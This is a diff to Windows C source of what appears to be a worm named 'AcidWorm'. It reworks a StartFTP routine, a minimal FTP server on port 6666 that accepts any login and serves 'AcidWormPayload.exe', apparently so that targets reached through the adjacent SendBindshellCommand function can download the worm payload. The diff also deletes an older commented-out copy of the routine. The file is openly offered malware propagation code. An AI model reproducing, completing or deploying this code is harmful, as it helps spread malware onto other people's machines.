@@ -250,130 +250,6 @@ void SendBindshellCommand(const char* targetIP, int targetPort)
 }
 
 
-//DWORD WINAPI StartFTP(LPVOID lpParameter)
-//{
-//	SOCKET listenSock;
-//	SOCKET clientSock;
-//	struct sockaddr_in addr, clientAddr;
-//	socklen_t addrlen = sizeof(clientAddr);
-//	char recvBuf[1024];
-//	//char fileName[256];
-//	char fileName[256] = "AcidWormPayload.exe";
-//	int bytes, n;
-//
-//	// --- CREATE AND BIND SOCKET ---
-//	listenSock = socket(AF_INET, SOCK_STREAM, 0);
-//	if (listenSock == INVALID_SOCKET) return 0;
-//
-//	memset(&addr, 0, sizeof(addr));
-//	memset(&clientAddr, 0, sizeof(clientAddr));
-//
-//	addr.sin_family = AF_INET;
-//	addr.sin_addr.s_addr = INADDR_ANY; 
-//	addr.sin_port = htons(6666);
-//
-//	if (bind(listenSock, (struct sockaddr*)&addr, sizeof(addr)) != 0) 
-//	{
-//		printf("ftp bind failed\r\n");
-//
-//		return 0;
-//	}
-//
-//	if (listen(listenSock, 1) != 0)
-//	{
-//		printf("ftp listen failed\r\n");
-//		return 0;
-//	}
-//
-//	while (1)
-//	{
-//		clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &addrlen);
-//		if (clientSock == INVALID_SOCKET)
-//		{
-//			printf("invalid sock\r\n");
-//			break;
-//		}
-//
-//		// --- HANDSHAKE ---
-//		send(clientSock, "220 OK\r\n", 8, 0);
-//
-//		while (1)
-//		{
-//			// --- RECEIVE COMMAND ---
-//			n = 0;
-//			while (1)
-//			{
-//				bytes = recv(clientSock, &recvBuf[n], 1, 0);
-//
-//				if (bytes <= 0)
-//				{
-//					break;
-//				}
-//
-//				if (recvBuf[n] == '\n') 
-//				{ 
-//					recvBuf[n] = 0; 
-//					break; 
-//				}
-//
-//				if (recvBuf[n] != '\r') n++;
-//			}
-//
-//			if (bytes <= 0)
-//			{
-//				break;
-//			}
-//
-//			// --- USER ---
-//			if (!strncmp(recvBuf, "AcidWorm", 4))
-//			{
-//				printf("%s", recvBuf);
-//				send(clientSock, "331 OK\r\n", 8, 0);
-//			}
-//
-//			// --- RETR ---
-//			else if (!strncmp(recvBuf, "RETR", 4))
-//			{
-//				printf("%s", recvBuf);
-//				sscanf(recvBuf, "RETR %255s", fileName);
-//
-//				FILE* f = fopen(fileName, "rb");
-//				if (!f)
-//				{
-//					send(clientSock, "450 File not found\r\n", 21, 0);
-//					continue;
-//				}
-//
-//				send(clientSock, "150 Opening data connection\r\n", 30, 0);
-//
-//				char buffer[40000];
-//				int r;
-//				while ((r = fread(buffer, 1, sizeof(buffer), f)) > 0)
-//				{
-//					send(clientSock, buffer, r, 0);
-//				}
-//
-//				fclose(f);
-//
-//				send(clientSock, "226 Transfer complete\r\n", 23, 0);
-//			}
-//
-//			// --- QUIT ---
-//			else if (!strncmp(recvBuf, "QUIT", 4))
-//			{
-//				printf("%s", recvBuf);
-//				send(clientSock, "221 Bye\r\n", 9, 0);
-//				closesocket(clientSock);
-//				break;
-//			}
-//		}
-//	}
-//
-//	closesocket(listenSock);
-//	ExitThread(0);
-//}
-
-
 DWORD WINAPI StartFTP(LPVOID lpParameter)
 {
 	SOCKET listenSock;
@@ -382,11 +258,15 @@ DWORD WINAPI StartFTP(LPVOID lpParameter)
 	socklen_t addrlen = sizeof(clientAddr);
 	char recvBuf[1024];
 	char fileName[256] = "AcidWormPayload.exe";
-	int bytes, n, s_data_act;
+	int bytes, n, s_data_act = 0;
 
-	// --- CREATE AND BIND SOCKET ---
+	// --- CREATE SOCKETS ---
 	listenSock = socket(AF_INET, SOCK_STREAM, 0);
-	if (listenSock == INVALID_SOCKET) return 0;
+	if (listenSock == INVALID_SOCKET) 
+	{
+		return 0;
+	}
+
 
 	memset(&addr, 0, sizeof(addr));
 	memset(&clientAddr, 0, sizeof(clientAddr));
@@ -397,32 +277,32 @@ DWORD WINAPI StartFTP(LPVOID lpParameter)
 
 	if (bind(listenSock, (struct sockaddr*)&addr, sizeof(addr)) != 0)
 	{
-		printf("\t[FTP] bind failed %d\n", WSAGetLastError());
+		printf("\t[*] [FTP] bind failed %d\n", WSAGetLastError());
 		return 0;
 	}
 
 	if (listen(listenSock, 1) != 0)
 	{
-		printf("\t[FTP] listen failed %d\n", WSAGetLastError());
+		printf("\t[*] [FTP] listen failed %d\n", WSAGetLastError());
 		return 0;
 	}
 
-	printf("\t[FTP] Server running on port 6666...\n");
+	printf("\t[*] [FTP] Server running on port 6666...\n");
 
 	while (1)
 	{
 		clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &addrlen);
 		if (clientSock == INVALID_SOCKET)
 		{
-			printf("\t[FTP] accept failed %d\n", WSAGetLastError());
+			printf("\t[*] [FTP] accept failed %d\n", WSAGetLastError());
 			break;
 		}
 
-		printf("\t[FTP] Client connected: %s\n", inet_ntoa(clientAddr.sin_addr));
+		printf("\t[*] [FTP] Client connected: %s\n", inet_ntoa(clientAddr.sin_addr));
 
 		// --- HANDSHAKE ---
 		send(clientSock, "220 OK\r\n", 8, 0);
-		printf("\tSENT: 220 OK\n");
+		printf("\t[*] SENT: 220 OK\n");
 
 		while (1)
 		{
@@ -446,45 +326,52 @@ DWORD WINAPI StartFTP(LPVOID lpParameter)
 
 			if (bytes <= 0)
 			{
-				printf("\t[FTP] Client disconnected\n");
+				printf("\t[*] [FTP] Client disconnected\n");
 				break;
 			}
 
-			printf("\tRECV: %s\n", recvBuf);
+			printf("\t[*] RECV: %s\n", recvBuf);
 
 			// --- USER ---
 			if (!strncmp(recvBuf, "USER", 4))
 			{
 				send(clientSock, "331 OK\r\n", 8, 0);
-				printf("\tSENT: 331 OK\n");
+				printf("\t[*] SENT: 331 OK\n");
 			}
 
 			// --- PASS ---
 			else if (!strncmp(recvBuf, "PASS", 4))
 			{
 				send(clientSock, "230 Logged in\r\n", 15, 0);
-				printf("\tSENT: 230 Logged in\n");
+				printf("\t[*] SENT: 230 Logged in\n");
 			}
 
 			// --- RETR ---
 			else if (!strncmp(recvBuf, "RETR", 4) || !strncmp(recvBuf, "get", 3))
 			{
-				sscanf(recvBuf, "RETR %255s", fileName);
-				printf("\t[FTP] RETR requested: %s\n", fileName);
+
+				printf("[*] retr reached");
+				
+				if (!sscanf(recvBuf, "RETR %255s", fileName))
+				{
+					printf("[*] scanf failed %i", GetLastError());
+				}
+				printf("\t[*] [FTP] RETR requested: %s\n", fileName);
 
 				FILE* f = fopen(fileName, "rb");
 				if (!f)
 				{
 					send(clientSock, "450 File not found\r\n", 21, 0);
-					printf("\tSENT: 450 File not found\n");
+					printf("\t[*] SENT: 450 File not found\n");
 					continue;
 				}
 
 				send(clientSock, "150 Opening data connection\r\n", 30, 0);
-				printf("\tSENT: 150 Opening data connection\n");
+				printf("\t[*] SENT: 150 Opening data connection\n");
 
 				char buffer[40000];
 				int r;
+
 
 				while ((r = fread(buffer, 1, sizeof(buffer), f)) > 0)
 				{
@@ -498,44 +385,63 @@ DWORD WINAPI StartFTP(LPVOID lpParameter)
 				fclose(f);
 
 				send(clientSock, "226 Transfer complete\r\n", 23, 0);
-				printf("\tSENT: 226 Transfer complete\n");
+				printf("\t[*] SENT: 226 Transfer complete\n");
+
+				closesocket(s_data_act);
+				s_data_act = 0;
 			}
 			// --- BIN ---
 			else if (!strncmp(recvBuf, "TYPE", 4))
 			{
-				printf("\t[FTP] %s\n", recvBuf);
+				printf("\t[*] [FTP] %s\n", recvBuf);
 				send(clientSock, "200 Type set to I\r\n", 19, 0);
 			}
+			// --- PORT ---
 			else if (!strncmp(recvBuf, "PORT", 4)) 
 			{
-				unsigned int h1, h2, h3, h4, p1, p2;
-				sscanf(recvBuf, "PORT %u,%u,%u,%u,%u,%u", &h1, &h2, &h3, &h4, &p1, &p2);
-				char ip[16];
-				sprintf(ip, "%u.%u.%u.%u", h1, h2, h3, h4);
-				unsigned short port = p1 * 256 + p2;
+
+				unsigned char act_port[2];
+				int act_ip[4], port_dec;
+				char ip_decimal[40];
+
+				sscanf(recvBuf, "PORT %d,%d,%d,%d,%d,%d", &act_ip[0], &act_ip[1], &act_ip[2], &act_ip[3], (int*)&act_port[0], (int*)&act_port[1]);
+				sprintf(ip_decimal, "%d.%d.%d.%d", act_ip[0], act_ip[1], act_ip[2], act_ip[3]);
+				port_dec = act_port[0] * 256 + act_port[1];
+
+				// close old data socket if open
+				if (s_data_act != 0 && s_data_act != INVALID_SOCKET)
+					closesocket(s_data_act);
+
+				// create a new data socket
+				s_data_act = socket(AF_INET, SOCK_STREAM, 0);
 
 				// connect back to client
-				s_data_act = socket(AF_INET, SOCK_STREAM, 0);
 				struct sockaddr_in dataAddr;
-				dataAddr.sin_family = AF_INET;
-				dataAddr.sin_port = htons(port);
-				dataAddr.sin_addr.s_addr = inet_addr(ip);
 
-				if (connect(s_data_act, (struct sockaddr*)&dataAddr, sizeof(dataAddr)) != 0) {
+				memset(&dataAddr, 0, sizeof(dataAddr));
+
+				dataAddr.sin_family = AF_INET;
+				dataAddr.sin_port = htons(port_dec);
+				dataAddr.sin_addr.s_addr = inet_addr(ip_decimal);
+
+				Sleep(1000);
+
+				if (connect(s_data_act, (struct sockaddr*)&dataAddr, sizeof(dataAddr)) != 0) 
+				{
 					send(clientSock, "425 Can't open data connection\r\n", 31, 0);
 					closesocket(s_data_act);
 					s_data_act = 0;
 				}
-				else 
-				{
-					send(clientSock, "200 PORT command successful\r\n", 28, 0);
-				}
+
+				send(clientSock, "200 PORT command successful\r\n", 28, 0);
+				printf("\t[*] Data connection to client created\n");
+				
 			}
 			// --- QUIT ---
 			else if (!strncmp(recvBuf, "QUIT", 4))
 			{
 				send(clientSock, "221 Bye\r\n", 9, 0);
-				printf("\tSENT: 221 Bye\n");
+				printf("\t[*] SENT: 221 Bye\n");
 
 				closesocket(clientSock);
 				break;
@@ -545,7 +451,7 @@ DWORD WINAPI StartFTP(LPVOID lpParameter)
 			else
 			{
 				send(clientSock, "500 Unknown command\r\n", 22, 0);
-				printf("\tSENT: 500 Unknown command\n");
+				printf("\t[*] SENT: 500 Unknown command\n");
 			}
 		}
 	}
